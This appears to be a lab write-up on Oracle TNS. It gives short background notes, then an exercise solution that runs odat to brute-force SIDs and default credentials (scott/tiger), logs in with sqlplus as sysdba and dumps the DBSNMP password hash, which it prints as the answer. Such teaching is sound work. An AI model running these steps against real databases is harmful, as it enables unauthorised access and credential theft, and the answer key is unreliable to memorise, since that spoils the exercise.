
## Oracle TNS

- Oracle TNS stands for Oracle Transparent Network Substrate.
- The underlying networking component which helps in communication between Oracle databases and applications over the networks.
- TNS supports TCP/IP protocol and as a result has become a preferred solution for managing large complex databases in healthcare, finance, and retail industries.
- Over time, TNS has been updated to support newer technologies, including `IPv6` and `SSL/TLS` encryption
- Oracle TNS uses `TCP Port 1521`.

## Oracle Database SID

- In Oracle RDBMS, a System Identifier (`SID`) is a unique name that identifies a particular database instance. The instance is a set of processes and memory structures that interact to manage database data.
- This SID defines the new instance. So the same database can have multiple instances or maybe talking about different databases.

## Oracle TNS Configurations

- The configuration files for Oracle TNS are called `tnsnames.ora` and `listener.ora` and are typically located in the `$ORACLE_HOME/network/admin` directory.
- The `tnsnames.ora` is a plaintext file which contains info about the databases instances and info for clients to connect to the service.
- The `tnsnames.ora` works in Client-side to resolve services names to their corresponding IP addresses.
- The `listener.ora` determines which services the client needs to listen to.

---
## Questions and Solutions

- Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.
	- **E066D214D5421CCC**


Using the `odat.py` gave us a valid SID name which is `XE` and the valid credentials containing the below 2 information.
- **username = scott**
- **password = tiger**

```bash
$ odat all -s 10.129.205.19
[+] Checking if target 10.129.205.19:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.205.19:1521 is well configured. Continue...

[1] (10.129.205.19:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
[+] Impossible to know if target is vulnerable to a remote TNS poisoning because SID is not given.

[2] (10.129.205.19:1521): Searching valid SIDs
[2.1] Searching valid SIDs thanks to a well known SID list on the 10.129.205.19:1521 server
[+] 'XE' is a valid SID. Continue...             ########################################################################################################################################################################  | ETA:  00:00:04 
100% |#####################################################################################################################################################################################################################| Time: 00:07:14 
[2.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.129.205.19:1521)
100% |#####################################################################################################################################################################################################################| Time: 00:00:12 
[2.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.129.205.19:1521)
[+] 'XE' is a valid SID. Continue...             ##################################################################################################################################################                        | ETA:  00:00:40 
100% |#####################################################################################################################################################################################################################| Time: 00:06:12 
[+] SIDs found on the 10.129.205.19:1521 server: XE

[3] (10.129.205.19:1521): Searching valid Service Names
[3.1] Searching valid Service Names thanks to a well known Service Name list on the 10.129.205.19:1521 server
[+] 'XE' is a valid Service Name. Continue...    ########################################################################################################################################################################  | ETA:  00:00:03 
[+] 'XEXDB' is a valid Service Name. Continue... 
100% |#####################################################################################################################################################################################################################| Time: 00:06:57 
[3.2] Searching valid Service Names thanks to a brute-force attack on 1 chars now (10.129.205.19:1521)
100% |#####################################################################################################################################################################################################################| Time: 00:00:11 
[3.3] Searching valid Service Names thanks to a brute-force attack on 2 chars now (10.129.205.19:1521)
[+] 'XE' is a valid Service Name. Continue...    ##################################################################################################################################################                        | ETA:  00:00:42 
100% |#####################################################################################################################################################################################################################| Time: 00:06:21 
[+] Service Name(s) found on the 10.129.205.19:1521 server: XE,XEXDB
[!] Notice: SID 'XE' found. Service Name 'XE' found too: Identical database instance. Removing Service Name 'XE' from Service Name list in order to don't do same checks twice
[4] (10.129.205.19:1521): Searching valid accounts on the XE SID
The login cis has already been tested at least once. What do you want to do:                                                                                                | ETA:  00:12:11 
- stop (s/S)
- continue and ask every time (a/A)
- skip and continue to ask (p/P)
- continue without to ask (c/C)
c
[!] Notice: 'ctxsys' account is locked, so skipping this username for password                                                                                              | ETA:  00:40:38 
[!] Notice: 'dbsnmp' account is locked, so skipping this username for password                                                                                              | ETA:  00:36:50 
[!] Notice: 'dip' account is locked, so skipping this username for password                                                                                                 | ETA:  00:32:10 
[!] Notice: 'hr' account is locked, so skipping this username for password                                                                                                  | ETA:  00:21:17 
[!] Notice: 'mdsys' account is locked, so skipping this username for password##########                                                                                     | ETA:  00:14:00 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password#######################                                                                   | ETA:  00:10:02 
[!] Notice: 'outln' account is locked, so skipping this username for password###################################                                                            | ETA:  00:08:48 
[+] Valid credentials found: scott/tiger. Continue...           ##########################################################################                                  | ETA:  00:04:30 
[!] Notice: 'xdb' account is locked, so skipping this username for password##########################################################################################       | ETA:  00:00:50 
100% |######################################################################################################################################################################| Time: 00:21:00 
[+] Accounts found on 10.129.205.19:1521/sid:XE: 
scott/tiger
```


Using `sqlplus` to login to the oracle database inside the `XE` service name.

```bash
$ sqlplus scott@10.129.205.19/XE as sysdba

SQL*Plus: Release 19.0.0.0.0 - Production on Sun Feb 8 08:54:20 2026
Version 19.6.0.0.0

Copyright (c) 1982, 2019, Oracle.  All rights reserved.

Enter password: 

Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> select name, password from sys.user$ where name='DBSNMP';

NAME                           PASSWORD
------------------------------ ------------------------------
DBSNMP                         E066D214D5421CCC
```

